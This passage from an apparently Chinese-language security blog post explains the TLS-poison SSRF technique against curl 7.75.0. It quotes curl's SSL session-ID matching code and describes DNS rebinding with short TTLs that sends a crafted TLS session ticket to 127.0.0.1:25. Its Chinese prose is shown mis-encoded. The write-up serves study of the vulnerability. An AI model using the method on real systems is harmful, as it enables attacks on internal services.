||</span><br><span class="line">      (conn-&gt;bits.conn_to_host &amp;&amp; check-&gt;conn_to_host &amp;&amp;</span><br><span class="line">       strcasecompare(conn-&gt;conn_to_host.name, check-&gt;conn_to_host))) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port == <span class="hljs-number">-1</span>) ||</span><br><span class="line">      (conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port != <span class="hljs-number">-1</span> &amp;&amp;</span><br><span class="line">       conn-&gt;conn_to_port == check-&gt;conn_to_port)) &amp;&amp;</span><br><span class="line">     (port == check-&gt;remote_port) &amp;&amp;</span><br><span class="line">     strcasecompare(conn-&gt;handler-&gt;scheme, check-&gt;scheme) &amp;&amp;</span><br><span class="line">     Curl_ssl_config_matches(ssl_config, &amp;check-&gt;ssl_config)) {</span><br><span class="line">    <span class="hljs-comment">/* yes, we have a session ID! */</span></span><br><span class="line">    (*general_age)++;          <span class="hljs-comment">/* increase general age */</span></span><br><span class="line">    check-&gt;age = *general_age; <span class="hljs-comment">/* set this as used in this age */</span></span><br><span class="line">    *ssl_sessionid = check-&gt;sessionid;</span><br><span class="line">    <span class="hljs-keyword">if</span>(idsize)</span><br><span class="line">      *idsize = check-&gt;idsize;</span><br><span class="line">    no_match = FALSE;</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>ä¸Šè¿°ä»£ç å°±æ˜¯é€šè¿‡å¯¹äºç«¯å£ã€åè®®ã€åŸŸåçš„æ¯”è¾ƒæ¥å†³å®šæ˜¯å¦ä½¿ç”¨ sessionid ï¼Œè€Œ<code>check</code>å˜é‡çš„ç»“æ„ä½“å°±æ˜¯<code>Curl_ssl_session</code>ï¼Œåœ¨ lib/urldata.h#295 å½“ä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°å¯¹äº<code>Curl_ssl_session</code>ç»“æ„ä½“çš„å®šä¹‰</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* information stored about one single SSL session */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_ssl_session</span> {</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *name;       <span class="hljs-comment">/* host name for which this ID was used */</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *conn_to_host; <span class="hljs-comment">/* host name for the connection (may be NULL) */</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *scheme; <span class="hljs-comment">/* protocol scheme used */</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *sessionid;  <span class="hljs-comment">/* as returned from the SSL layer */</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> idsize;    <span class="hljs-comment">/* if known, otherwise 0 */</span></span><br><span class="line">  <span class="hljs-keyword">long</span> age;         <span class="hljs-comment">/* just a number, the higher the more recent */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> remote_port;  <span class="hljs-comment">/* remote port */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> conn_to_port; <span class="hljs-comment">/* remote port for the connection (may be -1) */</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ssl_primary_config</span> <span class="hljs-title">ssl_config</span>;</span> <span class="hljs-comment">/* setup for this session */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ‰€ä»¥å¯¹äº curl 7.75.0 æ¥è¯´ï¼Œè¿™ä¸ªè§„åˆ™å°±æ˜¯ç«¯å£ç›¸åŒã€åŸŸåç›¸åŒã€åè®®ç›¸åŒï¼Œ curl å°±ä¼šå°è¯•å»ä½¿ç”¨ sessionid è¿›è¡Œè®¿é—®ã€‚</p><p>æ‰€ä»¥æ•´ä¸ªæ”»å‡»æ€è·¯æˆ‘ä»¬å¤§ä½“ä¸Šå°±æ˜ç™½äº†ï¼Œè®©æˆ‘ä»¬å†æ¥çœ‹çœ‹ä½œè€…å½“åˆæå‡ºçš„æ”»å‡»æµç¨‹ï¼Œç›´è§‚æ„Ÿå—ä¸€ä¸‹è¿™ä¸ªæ”»å‡»ï¼ˆè¿™é‡Œæˆ‘ä»¬ç”¨ HTTPS ä¸¾ä¾‹ï¼‰ï¼š</p><ol><li>é¦–å…ˆç¬¬ä¸€æ­¥æ”»å‡»è€…å‘é€ä¸€ä¸ª <a href="https://jmaddux.com:25" target="_blank" rel="noopener">https://jmaddux.com:25</a> çš„åœ°å€ç»™ä¸€ä¸ª Client ï¼ŒClient ä¼šé¦–å…ˆè¿›è¡Œ DNS æŸ¥è¯¢è¯¢é—® jmaddux.com çš„ IP åœ°å€ï¼Œæ­¤æ—¶æ”»å‡»è€…è‡ªå·±æ§åˆ¶çš„ DNS Server å¯ä»¥è‡ªå®šä¹‰å“åº”ä¸ºä¸€ä¸ªæ­£å¸¸çš„ IP ï¼Œæ¯”å¦‚ 35.x.x.x ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç»™è¿™ä¸ªå“åº”è®°å½•éå¸¸çŸ­éå¸¸çŸ­çš„ TTL ï¼Œä»¥ä¾¿è®© Client ä¸è¦ç¼“å­˜æˆ‘ä»¬çš„ DNS è®°å½•ã€‚</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/4.jpg" alt=""></p><ol start="2"><li>ç¬¬äºŒæ­¥ï¼Œ Client ä¼šä¸æ”»å‡»è€…æŒ‡å®šçš„ 35.x.x.x è¿™ä¸ªæ”»å‡»è€…çš„æœåŠ¡å™¨è¿›è¡Œ TLS æ¡æ‰‹ï¼Œå¹¶è·å¾—æ”»å‡»è€…æœåŠ¡å™¨è¿”å›ç»™ Client çš„ç‰¹åˆ¶çš„ç¥¨æ®ï¼Œåœ¨å›¾ä¸­è¡¨ç¤ºä¸º Payload ï¼Œç„¶åå®Œæˆ TLS æ¡æ‰‹ã€‚</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/5.jpg" alt=""></p><ol start="3"><li>ç¬¬ä¸‰éƒ¨ï¼Œå½“ Client æƒ³ä¸ Server æ¢å¤ä¼šè¯æ—¶ï¼Œéœ€è¦å†æ¬¡æŸ¥æ‰¾ jmaddux.com çš„ DNS è®°å½•ï¼Œç”±äºæ”»å‡»è€…ä¹‹å‰ç»™çš„ DNS è®°å½• TTL æ—¶é—´éå¸¸éå¸¸çŸ­ï¼Œè®©å…¶åœ¨æ­¤æ—¶åœ¨è‡ªå·±çš„ç¼“å­˜ä¸­æŸ¥ä¸åˆ°åŸæ¥çš„è®°å½•ï¼Œè¿™æ ·ä¼šä½¿å¾— Client åˆå»è¯¢é—® jmaddux.com çš„ DNS è®°å½•ï¼Œæ­¤æ—¶æ”»å‡»è€…è®©å…¶ DNS Server è¿”å› 127.0.0.1 è¿™ä¸ªåœ°å€ã€‚</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/6.jpg" alt=""></p><ol start="4"><li>æœ€åï¼Œå¦‚æœ Client ä¸æ ¡éªŒæœ¬æ¬¡è·å¾—çš„ ip æ˜¯å¦ä¸ä¸Šæ¬¡ä¸€è‡´ï¼Œå°±ä¼šå°è¯•ä¸ 127.0.0.1:25 è¿›è¡Œ TLS Session Resumption ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ Client ä¼šæ‹¿ç€æ”»å‡»è€…ç‰¹åˆ¶çš„ç¥¨æ®è®¿é—® 127.0.0.1:25 ï¼Œå°è¯•ä¸ä¹‹æ¢å¤ TLS ä¼šè¯ï¼Œè¿™é‡Œå°±è¡¨ç°ä¸º Client å‘é€å«æœ‰ Payload çš„ Client Hello æ¶ˆæ¯åˆ° SMTP æœåŠ¡å™¨ï¼Œè‡³æ­¤å®Œæˆä¸€æ¬¡ SSRF æ”»å‡»ã€‚</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/7.jpg" alt=""></p><p>æ•´ä½“çš„æµç¨‹å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg" alt=""></p><p>è¿™é‡Œå†å¯¹å›¾ä¸­è¿›è¡Œä¸€äº›è§£é‡Šï¼š</p><ol><li>æ”»å‡»è€…é€šè¿‡ä¸€äº›æ–¹å¼è®©å—å®³è€…æ‰“å¼€ä¸€ä¸ª HTML é¡µé¢ï¼Œå…¶ä¸­å†…å®¹ä¼šå‘æ”»å‡»è€…å‡†å¤‡çš„ TLS Server <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a> å‘èµ·è¯·æ±‚</li><li>å½“å—å®³è€…æ‰“å¼€è¿™ä¸ªé¡µé¢åï¼Œå—å®³è€…å®¢æˆ·ç«¯ä¼šæŸ¥è¯¢ ssltest.jmaddux.com çš„ DNS 